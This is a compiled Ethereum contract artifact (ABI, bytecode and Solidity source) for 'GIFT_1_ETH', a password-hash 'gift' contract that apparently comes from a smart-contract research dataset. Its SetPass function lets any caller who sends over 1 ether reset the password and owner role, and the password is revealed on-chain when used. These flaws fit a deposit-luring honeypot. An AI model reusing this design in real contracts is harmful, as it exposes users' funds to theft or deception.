{
  "contractName": "GIFT_1_ETH",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetHash",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "SetPass",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "date",
          "type": "uint256"
        }
      ],
      "name": "SetGiftTime",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_reciver",
          "type": "address"
        }
      ],
      "name": "SetReciver",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "PassHasBeenSet",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160006101000a81548160ff02191690831515021790555034801561002b57600080fd5b506106168061003b6000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630a6fbb0514610085578063181ffc5f146100a957806331fd725a146100d7578063410c800514610108578063b456ecc51461014b578063bea948c8146101d0578063dac47a71146101da575b005b6100a76004803603810190808035600019169060200190929190505050610207565b005b6100d560048036038101908080359060200190820180359060200191909192939192939050505061029a565b005b3480156100e357600080fd5b506101066004803603810190808035600019169060200190929190505050610338565b005b34801561011457600080fd5b50610149600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506103c0565b005b34801561015757600080fd5b506101b2600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061045a565b60405180826000191660001916815260200191505060405180910390f35b6101d86104c6565b005b3480156101e657600080fd5b506102056004803603810190808035906020019092919050505061058a565b005b600160009054906101000a900460ff1615801561022b5750670de0b6b3a764000034115b8061023f5750600060010260005460001916145b15610297578060008160001916905550336001806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550426003819055505b50565b818160405180838380828437820191505092505050604051809103902060001916600054600019161480156102d0575060035442115b15610334573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610332573d6000803e3d6000fd5b505b5050565b60005460001916816000191614801561039d57506001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b156103bd5760018060006101000a81548160ff0219169083151502179055505b50565b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156104575780600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6000816040518082805190602001908083835b602083101515610492578051825260208201915060208101905060208303925061046d565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390209050919050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16148015610524575060035442115b15610588573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610586573d6000803e3d6000fd5b505b565b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156105e757806003819055505b505600a165627a7a72305820fa47e07df5582f26b9e3c34387968cb937ec77e20e5cbb8d7f3099b3c74b052d0029",
  "source": "\n\ncontract GIFT_1_ETH\n{\n    function GetGift(bytes pass)\n    external\n    payable\n    {\n        if(hashPass == keccak256(pass) && now>giftTime)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    function GetGift()\n    public\n    payable\n    {\n        if(msg.sender==reciver && now>giftTime)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    bytes32 hashPass;\n    \n    bool closed = false;\n    \n    address sender;\n    \n    address reciver;\n \n    uint giftTime;\n \n    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}\n    \n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )\n        {\n            hashPass = hash;\n            sender = msg.sender;\n            giftTime = now;\n        }\n    }\n    \n    function SetGiftTime(uint date)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            giftTime = date;\n        }\n    }\n    \n    function SetReciver(address _reciver)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            reciver = _reciver;\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(hash==hashPass&&msg.sender==sender)\n        {\n           closed=true;\n        }\n    }\n    \n    function() public payable{}\n    \n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x0595d187cac88f04466371eff3a6b6d1b12fb013/contracts/0x0595d187cac88f04466371eff3a6b6d1b12fb013.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:39:03.972Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}